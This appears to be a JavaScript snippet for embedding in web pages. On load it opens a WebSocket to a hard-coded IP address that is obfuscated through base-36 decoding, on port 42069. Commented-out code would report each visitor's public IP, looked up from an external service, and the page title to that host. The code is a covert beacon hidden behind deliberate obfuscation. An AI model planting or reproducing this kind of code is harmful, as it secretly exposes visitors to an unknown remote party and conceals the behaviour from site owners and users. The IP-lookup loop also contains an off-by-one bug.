//var myIP = getIP();
// to minimize reloading/closing time

function Connection(ip,port){
	this.ip = ip || "localhost";
	this.port = port;
	this.socket = new WebSocket("ws://" + this.ip + ":" + this.port);
	this.refresh = function(){
		//this.socket.send(myIP+" left for connection refresh");
		this.socket = new WebSocket("ws://" + this.ip + ":" + this.port);
	}
}

var Main = new Connection(c(30)+"."+c("1D")+"."+c("69")+"."+c("6N"),"42069");

Main.socket.onopen = function(){
	//Main.socket.send("joined "+(document.title||location.href));
}

function c(a){
	return parseInt(a.toString(),36);
}

function getIP(){
    if (window.XMLHttpRequest) xmlhttp = new XMLHttpRequest();
    else xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");

    xmlhttp.open("GET","http://api.hostip.info/get_html.php",false);
    xmlhttp.send();

    hostipInfo = xmlhttp.responseText.split("\n");

    for (i=0; hostipInfo.length>=i; i++){
        ipAddress = hostipInfo[i].split(": ");
        if(ipAddress[0] === "IP") return ipAddress[1];
    }

    return false;
}